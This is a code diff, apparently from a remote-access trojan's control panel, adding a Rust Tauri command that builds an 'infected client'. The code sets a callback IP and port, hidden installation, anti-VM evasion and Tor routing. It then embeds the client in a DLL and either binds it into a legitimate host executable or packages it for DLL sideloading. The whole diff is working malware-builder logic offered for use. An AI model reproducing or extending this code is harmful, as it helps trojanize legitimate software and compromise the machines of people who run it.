@@ -83,6 +83,123 @@ pub async fn send_server_command(
 }
 
 #[tauri::command]
+pub async fn build_infected_client(
+    ip: &str,
+    port: &str,
+    mutex_enabled: bool,
+    mutex: &str,
+    unattended_mode: bool,
+    assembly_info: AssemblyInfo,
+    enable_icon: bool,
+    icon_path: &str,
+    enable_install: bool,
+    install_folder: &str,
+    install_file_name: &str,
+    group: &str,
+    enable_hidden: bool,
+    anti_vm_detection: bool,
+    use_tor: bool,
+    tor_address: &str,
+    dll_name: &str,
+    host_exe_path: &str,
+    infection_method: &str,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    let log = Log {
+        event_type: "build_client".to_string(),
+        message: "Building infected client...".to_string(),
+    };
+    let _ = app_handle
+        .emit("server_log", log)
+        .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
+
+    let config = common::ClientConfig {
+        ip: ip.to_string(),
+        port: port.to_string(),
+        mutex_enabled,
+        mutex: mutex.to_string(),
+        unattended_mode,
+        group: group.to_string(),
+        install: enable_install,
+        file_name: install_file_name.to_string(),
+        install_folder: install_folder.to_string(),
+        enable_hidden,
+        anti_vm_detection,
+        use_tor,
+        tor_address: tor_address.to_string(),
+    };
+
+    apply_config(&config).await?;
+
+    match apply_rcedit(&assembly_info, enable_icon, icon_path).await {
+        Ok(_) => {}
+        Err(e) => {
+            let log = Log {
+                event_type: "build_failed".to_string(),
+                message: "Failed to build client for infection.".to_string(),
+            };
+            let _ = app_handle
+                .emit("server_log", log)
+                .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
+            return Err(e.to_string());
+        }
+    }
+
+    let client_exe_path = get_client_built_exe_path().map_err(|e| e.to_string())?;
+    let exe_dir = get_exe_dir().map_err(|e| e.to_string())?;
+
+    // In a real environment, we'd have pre-compiled stubs in /res or similar
+    // For this implementation, we assume they are built or available
+    let dll_stub_path = exe_dir.join("res/dll_stub.dll");
+    let binder_stub_path = exe_dir.join("res/binder_stub.exe");
+
+    // 1. Embed client in DLL
+    crate::utils::pe_infector::embed_client_in_dll(&dll_stub_path, &client_exe_path)?;
+
+    // 2. Randomize exports if needed
+    let final_dll_name = if dll_name.is_empty() {
+        crate::utils::pe_infector::randomize_dll_exports(&dll_stub_path)? + ".dll"
+    } else {
+        dll_name.to_string()
+    };
+
+    let output_path = if infection_method == "single" {
+        // 3. Create infected bundle
+        let output_path = exe_dir.join("infected_host.exe");
+        crate::utils::pe_infector::create_infected_bundle(
+            &binder_stub_path,
+            &std::path::Path::new(host_exe_path),
+            &dll_stub_path,
+            &final_dll_name,
+            &output_path
+        )?;
+        output_path
+    } else {
+        // Sideload mode: Prepare a directory with host and DLL
+        let output_dir = exe_dir.join("sideload_bundle");
+        fs::create_dir_all(&output_dir).map_err(|e| e.to_string())?;
+
+        let host_name = std::path::Path::new(host_exe_path).file_name().unwrap_or_default();
+        fs::copy(host_exe_path, output_dir.join(host_name)).map_err(|e| e.to_string())?;
+        fs::copy(&dll_stub_path, output_dir.join(&final_dll_name)).map_err(|e| e.to_string())?;
+
+        output_dir
+    };
+
+    let log = Log {
+        event_type: "build_finished".to_string(),
+        message: "Infected client built successfully.".to_string(),
+    };
+    let _ = app_handle
+        .emit("server_log", log)
+        .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
+
+    open_explorer(&output_path.to_string_lossy()).await?;
+
+    Ok("Infected client built".to_string())
+}
+
+#[tauri::command]
 pub async fn start_server(
     port: &str,
     tauri_state: State<'_, SharedTauriState>,
